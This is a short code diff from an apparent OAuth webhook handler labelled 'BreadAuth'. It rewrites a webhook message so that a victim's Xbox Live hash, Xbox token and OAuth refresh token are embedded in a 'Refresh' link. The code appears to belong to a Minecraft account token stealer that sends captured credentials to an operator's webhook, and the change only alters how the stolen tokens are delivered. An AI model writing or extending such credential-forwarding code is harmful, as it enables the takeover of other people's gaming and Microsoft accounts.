@@ -74,14 +74,7 @@ export default async function oauthWebhook(data: any, nwData:any, ip: string, we
         "username": "BreadAuth",
         "avatar_url": "https://i.pinimg.com/736x/93/27/e7/9327e7da553a3111959de04fdf2e2eb4.jpg",
         "embeds": [mcEmbed],
-        "components": [
-            {
-                "type": 2,
-                "label": "Refresh",
-                "style": 5,
-                "url": `${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token}&refresh_token=${refresh_token}`
-            }
-        ]
+        "content": `[Refresh](${refreshURL}?xbl_hash=${xbl_hash}&xbl_token=${xbl_token}&refresh_token=${refresh_token})`
     }
     const options = {
         method: "POST",
